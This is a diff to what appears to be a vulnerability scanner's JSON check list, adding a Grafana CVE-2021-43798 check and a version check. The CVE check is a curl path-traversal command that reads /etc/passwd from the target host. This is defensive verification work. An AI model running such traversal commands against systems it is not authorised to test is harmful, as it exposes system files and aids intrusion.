@@ -24,6 +24,27 @@
                 "hostname"
             ]
         },
+        "Grafana_CVE_2021_43798_Checks": {
+            "ids": [
+                "183776"
+            ],
+            "scan_type": "",
+            "parameters": "curl --silent http://{host}:{port}/public/plugins/alertlist/../../../../../../../../etc/passwd || (echo '_' && curl --silent -k -L -i https://{host}:{port}/public/plugins/alertlist/../../../../../../../../etc/passwd || echo '_')",
+            "verify_words": [
+                "root"
+            ]
+        },
+        "Grafana_Version_Checks": {
+            "ids": [
+                "184357",
+                "190601"
+            ],
+            "scan_type": "",
+            "parameters": "curl -s http://{host}:{port}/api/health || (echo '_' && curl -s -k https://{host}:{port}/api/health || echo '_')",
+            "verify_words": [
+                "version"
+            ]
+        },
         "PHP_Checks": {
             "ids": [
                 "10628",
